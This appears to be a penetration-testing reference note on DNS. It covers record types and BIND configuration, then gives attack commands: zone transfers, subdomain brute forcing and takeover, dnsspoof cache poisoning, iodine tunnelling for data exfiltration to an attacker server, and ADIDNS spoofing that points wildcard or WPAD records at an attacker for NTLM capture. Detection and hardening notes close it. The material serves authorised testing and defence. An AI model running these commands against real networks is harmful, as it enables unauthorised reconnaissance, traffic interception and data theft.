# DNS

#DNS #DomainNameServices #networkmanagement

## What is DNS?
Domain Name System — the phonebook of the internet: resolves names to IPs, hierarchical and distributed. On an engagement it's a recon goldmine — a misconfigured server hands you the entire internal network map via **zone transfer**, subdomain brute forcing reveals hidden hosts, and in AD environments the **DNS is domain-integrated** (ADIDNS), so it's both an enumeration source and a spoofing/coercion surface.

- Port **UDP 53** — standard queries; **TCP 53** — zone transfers and responses > 512 bytes
- Recursive resolution: resolver → root → TLD → authoritative
- In AD: DNS is usually **AD-integrated** on the DC (dynamic updates, records stored in the directory)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Network/dig\|dig]] | The primary query tool — records, `@server`, `axfr` zone transfer |
| [[Tools/Network/nslookup\|nslookup]] | Cross-platform query (interactive `server`/`set type=`) |
| [[Tools/Network/dnsenum\|dnsenum]] | Combined enum: records, AXFR, subdomain brute, reverse |
| [[Tools/Network/dnsrecon\|dnsrecon]] | Standard/AXFR/brute enumeration (`-t std,axfr,brt`) |
| [[Tools/Network/fierce\|fierce]] | Subdomain discovery + reverse-lookup sweep |
| [[Tools/Scanning/gobuster\|gobuster]] | Fast subdomain brute (`gobuster dns`) |
| [[Tools/Recon/amass\|amass]] | Passive + active subdomain enumeration (OSINT) |
| [[Tools/Recon/subjack\|subjack]] | Subdomain-takeover detection |
| [[Tools/Scanning/nuclei\|nuclei]] | Takeover templates (`-t takeovers/`) |
| [[Tools/AD/adidnsdump\|adidnsdump]] | Dump AD-integrated DNS incl. hidden records (authenticated) |
| [[Tools/Scanning/NMAP\|NMAP]] | `dns-brute`, `dns-recursion` NSE |

Also used inline: `ldns-walk` (NSEC zone walking), `iodine` (DNS tunnelling), `dnsspoof` (cache poisoning via MITM).

---

## Server Types

| Server Type | Description |
|---|---|
| `DNS Root Server` | Top of the DNS hierarchy; 13 globally. Last resort if NS doesn't respond. Managed by ICANN. |
| `Authoritative Nameserver` | Holds authority for a zone; returns binding answers for its zone only |
| `Non-authoritative Nameserver` | Collects DNS info via recursive/iterative queries; not responsible for a zone |
| `Caching DNS Server` | Caches responses from other servers for TTL duration |
| `Forwarding Server` | Forwards all queries to another DNS server |
| `Resolver` | Local resolver on a computer/router; performs name resolution locally |

---

## DNS Record Types

| Record | Description |
|---|---|
| `A` | IPv4 address for a hostname |
| `AAAA` | IPv6 address for a hostname |
| `CNAME` | Canonical name / alias → points to another hostname |
| `MX` | Mail exchange server for the domain (with priority) |
| `NS` | Authoritative nameservers for a domain |
| `PTR` | Reverse lookup: IP → hostname |
| `TXT` | Arbitrary text; used for SPF, DKIM, DMARC ([[Standards & Protocols/SPF-DKIM-DMARC\|email auth]]), domain verification |
| `SOA` | Start of Authority: primary NS, admin email, serial, refresh, retry, expire, minimum TTL |
| `SRV` | Service location records (host, port, priority, weight) |
| `CAA` | Certificate Authority Authorization — who can issue SSL certs |

---

## Configuration Files (BIND/named)

| File | Path |
|---|---|
| Main config | `/etc/bind/named.conf` |
| Local zones config | `/etc/bind/named.conf.local` |
| Options config | `/etc/bind/named.conf.options` |
| Zone files | `/etc/bind/db.<domain>` or `/var/cache/bind/` |

---

## Enumeration

### dig

```bash
# Basic A record lookup
dig A <domain>
dig A inlanefreight.com

# Specify DNS server
dig @<nameserver> <domain>
dig @10.129.14.128 inlanefreight.com

# All records
dig ANY @<nameserver> <domain>

# MX records
dig MX <domain>

# NS records
dig NS <domain>

# TXT records
dig TXT <domain>

# SOA record
dig SOA <domain>

# Reverse lookup (PTR)
dig -x <IP>
dig -x 10.129.14.128

# Zone transfer
dig axfr @<nameserver> <domain>
dig axfr @10.129.14.128 inlanefreight.com
```

### nslookup

```bash
# Forward lookup
nslookup <domain>
nslookup <domain> <nameserver>

# Reverse lookup
nslookup <IP>

# Query specific record type
nslookup -type=MX <domain>
nslookup -type=NS <domain>
nslookup -type=TXT <domain>
nslookup -type=SOA <domain>
nslookup -type=ANY <domain>

# Interactive mode
nslookup
> server 10.129.14.128
> set type=A
> inlanefreight.com
```

### Subdomain Enumeration

```bash
# gobuster DNS
gobuster dns -domain <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -domain inlanefreight.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r <nameserver>

# dnsenum
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 <domain>
dnsenum --enum inlanefreight.com -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# fierce
fierce --domain <domain>
fierce --domain <domain> --dns-servers <nameserver>

# amass
amass enum -d <domain>
amass enum -passive -d <domain>

# Nmap
nmap -p 53 --script dns-brute <domain>
nmap -sU -p 53 --script dns-recursion <target>

# dnsrecon
dnsrecon -d <domain> -t std                    # standard enum (A, NS, MX, SOA, TXT)
dnsrecon -d <domain> -t axfr                   # zone transfer attempt
dnsrecon -d <domain> -t brt -D wordlist.txt    # subdomain brute force
dnsrecon -d <domain> -t std,brt -D /usr/share/wordlists/dnsrecon/namelist.txt
```

---

## Attack Vectors

### Zone Transfer (AXFR)

```bash
# If allowed, reveals ALL internal DNS records
dig axfr @<nameserver> <domain>
host -l <domain> <nameserver>

# dnsenum automated
dnsenum --dnsserver <nameserver> <domain>

# Fierce
fierce --domain <domain>
```

### DNS Zone Walking (NSEC/NSEC3 — DNSSEC)

```bash
ldns-walk @<nameserver> <domain>
```

### Subdomain Takeover

```bash
# 1. Find subdomains pointing to defunct services (CNAME to inactive cloud resources)
# 2. Register the defunct resource to take over the subdomain
# Tool: subjack, nuclei -t takeovers/
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c /path/to/fingerprints.json
```

### DNS Cache Poisoning

```bash
# Requires interception or race condition — not easily automated
# dnsspoof (requires ARP poisoning first)
dnsspoof -i eth0 -f hosts.txt
```

### DNS Tunneling (Data Exfil)

```bash
# iodine (client/server for tunneling TCP over DNS)
# Server side (attacker)
iodined -f 10.0.0.1 tunnel.domain.com

# Client side (victim, after code exec)
iodine -f 10.129.14.128 tunnel.domain.com
```

### AD-integrated DNS (ADIDNS) — enum + spoofing

In Active Directory the DNS zone lives in the directory and **any authenticated user can create records by default** (secure dynamic update still allows creation of *new* names). This is both an enumeration source and an attack surface:

```bash
# Dump the zone incl. records hidden from anonymous queries (authenticated)
adidnsdump -u <domain>\\<user> -p <pass> <DC_IP>
adidnsdump -u <domain>\\<user> -p <pass> --print-zones <DC_IP>

# Add/spoof a record via dynamic update (nsupdate / bloodyAD / dnstool)
nsupdate            # then: server <DC>; update add evil.domain 3600 A <attacker>; send
python3 dnstool.py -u '<domain>\<user>' -p <pass> -a add -r <name> -d <attacker_ip> <DC>
```

- **Wildcard / WPAD injection**: create the `*` record or a `wpad` entry (the WPAD global-query-block list only protects the literal `wpad`, not names you add) → responses funnel to you for **MITM / NTLM capture** (feed [[Tools/Lateral Movement/responder|responder]]/relay). Cross-ref [[Services/File Xfer/SMB|SMB]] relay.
- **Subdomain takeover** (below) is the cloud analog of the same "point a name at attacker-controlled infra" idea.

---

## Detection & Artefacts

- **Zone transfer (AXFR)** is a single large TCP/53 response to a non-secondary host — trivially logged and abnormal; the loudest recon here.
- **Subdomain brute** = a burst of NXDOMAIN responses for guessed names from one resolver.
- **ADIDNS record creation** shows in DNS-Server event logs and as new objects under the zone in AD (directory replication) — a new `A`/wildcard/`wpad` record from a normal user account is the IOC.
- **DNS tunnelling** = high volume of long, high-entropy TXT/NULL/CNAME queries to one domain — the classic exfil signature.
- Defensive baseline: restrict `allow-transfer` to secondaries, disable open recursion, enable DNSSEC, set the ADIDNS global query block list + secure-only updates, and monitor for anomalous query volume/entropy.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `allow-transfer { any; }` | Zone transfer to any host → full internal topology disclosure |
| `allow-recursion { any; }` | Open recursive resolver → DDoS amplification / cache poisoning |
| `allow-query { any; }` | Queries allowed from any source IP |
| DNSSEC not configured | DNS spoofing / cache poisoning |
| Zone files world-readable | Internal network topology disclosed on-box |
| ADIDNS insecure/any-authenticated updates | Record spoofing, wildcard/WPAD injection → MITM/relay |
| Dangling CNAME to a deprovisioned cloud resource | Subdomain takeover |

---

## Quick Reference

| Goal | Command |
|---|---|
| Lookup A record | `dig A domain @nameserver` |
| Zone transfer | `dig axfr @nameserver domain` |
| All records | `dig ANY @nameserver domain` |
| Reverse lookup | `dig -x IP` |
| Subdomain brute | `gobuster dns --domain domain -w wordlist.txt` |
| Subdomain enum | `dnsenum --enum domain -f wordlist.txt` |
| Check open recursion | `nmap -sU -p 53 --script dns-recursion host` |
| Dump AD DNS | `adidnsdump -u dom\\user -p pass DC_IP` |
| Spoof AD record | `nsupdate` → `update add evil.dom 3600 A <attacker>` |

---

> [!note] **See also** — AD-integrated DNS ties into [[Services/Active Directory/Kerberos|Active Directory]] enumeration and [[Services/File Xfer/SMB|SMB]] relay (WPAD/wildcard → [[Tools/Lateral Movement/responder|responder]]); dumped via [[Tools/AD/adidnsdump|adidnsdump]]. Network-infra siblings [[Services/Network Management/LDAP|LDAP]] and [[Services/Network Management/NetBIOS|NetBIOS]] (the other name-resolution/poisoning surfaces), and [[Services/Network Management/NTP|NTP]] (clock-skew fix for Kerberos + time-shift MITM).

---

*Created: 2026-07-13*
*Updated: 2026-09-26*
*Model: claude-opus-4-8*
